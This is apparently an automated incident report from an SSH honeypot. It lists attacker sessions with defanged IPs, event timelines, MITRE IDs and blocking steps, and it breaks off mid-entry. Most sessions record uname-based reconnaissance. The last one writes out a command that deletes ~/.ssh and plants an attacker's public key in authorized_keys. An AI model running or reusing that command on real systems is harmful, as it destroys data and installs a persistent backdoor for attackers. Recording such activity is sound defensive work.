| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:06:27` | `cowrie.session.connect` |
| `2026-07-06 13:06:27` | `cowrie.client.version` |
| `2026-07-06 13:06:27` | `cowrie.client.kex` |
| `2026-07-06 13:06:28` | `cowrie.login.success` |
| `2026-07-06 13:06:30` | `cowrie.session.params` |
| `2026-07-06 13:06:30` | `cowrie.command.input` |
| `2026-07-06 13:06:30` | `cowrie.command.input` |
| `2026-07-06 13:06:30` | `cowrie.command.input` |
| `2026-07-06 13:06:30` | `cowrie.command.input` |
| `2026-07-06 13:06:30` | `cowrie.command.input` |
| `2026-07-06 13:06:30` | `cowrie.command.success` |
| `2026-07-06 13:06:30` | `cowrie.command.input` |
| `2026-07-06 13:06:30` | `cowrie.command.input` |
| `2026-07-06 13:06:30` | `cowrie.command.input` |
| `2026-07-06 13:06:30` | `cowrie.command.input` |
| `2026-07-06 13:06:30` | `cowrie.log.closed` |
| `2026-07-06 13:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd1fbdbd14c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:07 |
| **Last Seen** | 2026-07-06 13:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:07:49` | `cowrie.session.connect` |
| `2026-07-06 13:07:49` | `cowrie.client.version` |
| `2026-07-06 13:07:49` | `cowrie.client.kex` |
| `2026-07-06 13:07:51` | `cowrie.login.success` |
| `2026-07-06 13:07:52` | `cowrie.session.params` |
| `2026-07-06 13:07:52` | `cowrie.command.input` |
| `2026-07-06 13:07:52` | `cowrie.command.input` |
| `2026-07-06 13:07:52` | `cowrie.command.input` |
| `2026-07-06 13:07:52` | `cowrie.command.input` |
| `2026-07-06 13:07:52` | `cowrie.command.input` |
| `2026-07-06 13:07:52` | `cowrie.command.success` |
| `2026-07-06 13:07:52` | `cowrie.command.input` |
| `2026-07-06 13:07:52` | `cowrie.command.input` |
| `2026-07-06 13:07:52` | `cowrie.command.input` |
| `2026-07-06 13:07:52` | `cowrie.command.input` |
| `2026-07-06 13:07:52` | `cowrie.log.closed` |
| `2026-07-06 13:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-129568867216

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:08 |
| **Last Seen** | 2026-07-06 13:08 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:08:13` | `cowrie.session.connect` |
| `2026-07-06 13:08:16` | `cowrie.client.version` |
| `2026-07-06 13:08:16` | `cowrie.client.kex` |
| `2026-07-06 13:08:34` | `cowrie.login.success` |
| `2026-07-06 13:08:45` | `cowrie.session.params` |
| `2026-07-06 13:08:45` | `cowrie.command.input` |
| `2026-07-06 13:08:45` | `cowrie.command.input` |
| `2026-07-06 13:08:45` | `cowrie.command.input` |
| `2026-07-06 13:08:45` | `cowrie.command.input` |
| `2026-07-06 13:08:45` | `cowrie.command.input` |
| `2026-07-06 13:08:45` | `cowrie.command.success` |
| `2026-07-06 13:08:45` | `cowrie.command.input` |
| `2026-07-06 13:08:45` | `cowrie.command.input` |
| `2026-07-06 13:08:45` | `cowrie.command.input` |
| `2026-07-06 13:08:45` | `cowrie.command.input` |
| `2026-07-06 13:08:52` | `cowrie.log.closed` |
| `2026-07-06 13:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ddb80392d5a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:09 |
| **Last Seen** | 2026-07-06 13:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:09:12` | `cowrie.session.connect` |
| `2026-07-06 13:09:13` | `cowrie.client.version` |
| `2026-07-06 13:09:13` | `cowrie.client.kex` |
| `2026-07-06 13:09:14` | `cowrie.login.success` |
| `2026-07-06 13:09:16` | `cowrie.session.params` |
| `2026-07-06 13:09:16` | `cowrie.command.input` |
| `2026-07-06 13:09:16` | `cowrie.command.input` |
| `2026-07-06 13:09:16` | `cowrie.command.input` |
| `2026-07-06 13:09:16` | `cowrie.command.input` |
| `2026-07-06 13:09:16` | `cowrie.command.input` |
| `2026-07-06 13:09:16` | `cowrie.command.success` |
| `2026-07-06 13:09:16` | `cowrie.command.input` |
| `2026-07-06 13:09:16` | `cowrie.command.input` |
| `2026-07-06 13:09:16` | `cowrie.command.input` |
| `2026-07-06 13:09:16` | `cowrie.command.input` |
| `2026-07-06 13:09:16` | `cowrie.log.closed` |
| `2026-07-06 13:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5658bd104206

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:10 |
| **Last Seen** | 2026-07-06 13:11 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:10:30` | `cowrie.session.connect` |
| `2026-07-06 13:10:35` | `cowrie.client.version` |
| `2026-07-06 13:10:35` | `cowrie.client.kex` |
| `2026-07-06 13:10:54` | `cowrie.login.success` |
| `2026-07-06 13:11:03` | `cowrie.session.params` |
| `2026-07-06 13:11:03` | `cowrie.command.input` |
| `2026-07-06 13:11:03` | `cowrie.command.input` |
| `2026-07-06 13:11:03` | `cowrie.command.input` |
| `2026-07-06 13:11:03` | `cowrie.command.input` |
| `2026-07-06 13:11:03` | `cowrie.command.input` |
| `2026-07-06 13:11:03` | `cowrie.command.success` |
| `2026-07-06 13:11:03` | `cowrie.command.input` |
| `2026-07-06 13:11:03` | `cowrie.command.input` |
| `2026-07-06 13:11:03` | `cowrie.command.input` |
| `2026-07-06 13:11:03` | `cowrie.command.input` |
| `2026-07-06 13:11:07` | `cowrie.log.closed` |
| `2026-07-06 13:11:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee1b419dd29a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:10 |
| **Last Seen** | 2026-07-06 13:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:10:37` | `cowrie.session.connect` |
| `2026-07-06 13:10:37` | `cowrie.client.version` |
| `2026-07-06 13:10:37` | `cowrie.client.kex` |
| `2026-07-06 13:10:39` | `cowrie.login.success` |
| `2026-07-06 13:10:40` | `cowrie.session.params` |
| `2026-07-06 13:10:40` | `cowrie.command.input` |
| `2026-07-06 13:10:40` | `cowrie.command.input` |
| `2026-07-06 13:10:40` | `cowrie.command.input` |
| `2026-07-06 13:10:40` | `cowrie.command.input` |
| `2026-07-06 13:10:40` | `cowrie.command.input` |
| `2026-07-06 13:10:40` | `cowrie.command.success` |
| `2026-07-06 13:10:40` | `cowrie.command.input` |
| `2026-07-06 13:10:40` | `cowrie.command.input` |
| `2026-07-06 13:10:40` | `cowrie.command.input` |
| `2026-07-06 13:10:40` | `cowrie.command.input` |
| `2026-07-06 13:10:41` | `cowrie.log.closed` |
| `2026-07-06 13:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab9e5482eff5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 13:11 |
| **Last Seen** | 2026-07-06 13:11 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:11:00` | `cowrie.session.connect` |
| `2026-07-06 13:11:01` | `cowrie.client.version` |
| `2026-07-06 13:11:01` | `cowrie.client.kex` |
| `2026-07-06 13:11:07` | `cowrie.login.success` |
| `2026-07-06 13:11:11` | `cowrie.session.params` |
| `2026-07-06 13:11:11` | `cowrie.command.input` |
| `2026-07-06 13:11:13` | `cowrie.log.closed` |
| `2026-07-06 13:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dfc0498164f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:12 |
| **Last Seen** | 2026-07-06 13:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:12:00` | `cowrie.session.connect` |
| `2026-07-06 13:12:01` | `cowrie.client.version` |
| `2026-07-06 13:12:01` | `cowrie.client.kex` |
| `2026-07-06 13:12:02` | `cowrie.login.success` |
| `2026-07-06 13:12:03` | `cowrie.session.params` |
| `2026-07-06 13:12:03` | `cowrie.command.input` |
| `2026-07-06 13:12:03` | `cowrie.command.input` |
| `2026-07-06 13:12:03` | `cowrie.command.input` |
| `2026-07-06 13:12:03` | `cowrie.command.input` |
| `2026-07-06 13:12:03` | `cowrie.command.input` |
| `2026-07-06 13:12:03` | `cowrie.command.success` |
| `2026-07-06 13:12:03` | `cowrie.command.input` |
| `2026-07-06 13:12:03` | `cowrie.command.input` |
| `2026-07-06 13:12:03` | `cowrie.command.input` |
| `2026-07-06 13:12:03` | `cowrie.command.input` |
| `2026-07-06 13:12:04` | `cowrie.log.closed` |
| `2026-07-06 13:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-412f50ee1e19

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:12 |
| **Last Seen** | 2026-07-06 13:13 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:12:51` | `cowrie.session.connect` |
| `2026-07-06 13:12:54` | `cowrie.client.version` |
| `2026-07-06 13:12:54` | `cowrie.client.kex` |
| `2026-07-06 13:13:14` | `cowrie.login.success` |
| `2026-07-06 13:13:24` | `cowrie.session.params` |
| `2026-07-06 13:13:24` | `cowrie.command.input` |
| `2026-07-06 13:13:24` | `cowrie.command.input` |
| `2026-07-06 13:13:24` | `cowrie.command.input` |
| `2026-07-06 13:13:24` | `cowrie.command.input` |
| `2026-07-06 13:13:24` | `cowrie.command.input` |
| `2026-07-06 13:13:24` | `cowrie.command.success` |
| `2026-07-06 13:13:24` | `cowrie.command.input` |
| `2026-07-06 13:13:24` | `cowrie.command.input` |
| `2026-07-06 13:13:24` | `cowrie.command.input` |
| `2026-07-06 13:13:24` | `cowrie.command.input` |
| `2026-07-06 13:13:29` | `cowrie.log.closed` |
| `2026-07-06 13:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe11de91598c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:13 |
| **Last Seen** | 2026-07-06 13:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:13:24` | `cowrie.session.connect` |
| `2026-07-06 13:13:24` | `cowrie.client.version` |
| `2026-07-06 13:13:25` | `cowrie.client.kex` |
| `2026-07-06 13:13:26` | `cowrie.login.success` |
| `2026-07-06 13:13:27` | `cowrie.session.params` |
| `2026-07-06 13:13:27` | `cowrie.command.input` |
| `2026-07-06 13:13:27` | `cowrie.command.input` |
| `2026-07-06 13:13:27` | `cowrie.command.input` |
| `2026-07-06 13:13:27` | `cowrie.command.input` |
| `2026-07-06 13:13:27` | `cowrie.command.input` |
| `2026-07-06 13:13:27` | `cowrie.command.success` |
| `2026-07-06 13:13:27` | `cowrie.command.input` |
| `2026-07-06 13:13:27` | `cowrie.command.input` |
| `2026-07-06 13:13:27` | `cowrie.command.input` |
| `2026-07-06 13:13:27` | `cowrie.command.input` |
| `2026-07-06 13:13:27` | `cowrie.log.closed` |
| `2026-07-06 13:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8407fbc13d76

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:14 |
| **Last Seen** | 2026-07-06 13:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:14:46` | `cowrie.session.connect` |
| `2026-07-06 13:14:46` | `cowrie.client.version` |
| `2026-07-06 13:14:46` | `cowrie.client.kex` |
| `2026-07-06 13:14:48` | `cowrie.login.success` |
| `2026-07-06 13:14:49` | `cowrie.session.params` |
| `2026-07-06 13:14:49` | `cowrie.command.input` |
| `2026-07-06 13:14:49` | `cowrie.command.input` |
| `2026-07-06 13:14:49` | `cowrie.command.input` |
| `2026-07-06 13:14:49` | `cowrie.command.input` |
| `2026-07-06 13:14:49` | `cowrie.command.input` |
| `2026-07-06 13:14:49` | `cowrie.command.success` |
| `2026-07-06 13:14:49` | `cowrie.command.input` |
| `2026-07-06 13:14:49` | `cowrie.command.input` |
| `2026-07-06 13:14:49` | `cowrie.command.input` |
| `2026-07-06 13:14:49` | `cowrie.command.input` |
| `2026-07-06 13:14:49` | `cowrie.log.closed` |
| `2026-07-06 13:14:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ed6c87321d9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:15 |
| **Last Seen** | 2026-07-06 13:15 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:15:02` | `cowrie.session.connect` |
| `2026-07-06 13:15:07` | `cowrie.client.version` |
| `2026-07-06 13:15:07` | `cowrie.client.kex` |
| `2026-07-06 13:15:27` | `cowrie.login.success` |
| `2026-07-06 13:15:35` | `cowrie.session.params` |
| `2026-07-06 13:15:35` | `cowrie.command.input` |
| `2026-07-06 13:15:35` | `cowrie.command.input` |
| `2026-07-06 13:15:35` | `cowrie.command.input` |
| `2026-07-06 13:15:35` | `cowrie.command.input` |
| `2026-07-06 13:15:35` | `cowrie.command.input` |
| `2026-07-06 13:15:35` | `cowrie.command.success` |
| `2026-07-06 13:15:35` | `cowrie.command.input` |
| `2026-07-06 13:15:35` | `cowrie.command.input` |
| `2026-07-06 13:15:35` | `cowrie.command.input` |
| `2026-07-06 13:15:35` | `cowrie.command.input` |
| `2026-07-06 13:15:39` | `cowrie.log.closed` |
| `2026-07-06 13:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-570b939d922d

| Field | Detail |
|---|---|
| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-07-06 13:15 |
| **Last Seen** | 2026-07-06 13:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:15:38` | `cowrie.session.connect` |
| `2026-07-06 13:15:38` | `cowrie.client.version` |
| `2026-07-06 13:15:38` | `cowrie.client.kex` |
| `2026-07-06 13:15:39` | `cowrie.login.success` |
| `2026-07-06 13:15:40` | `cowrie.session.params` |
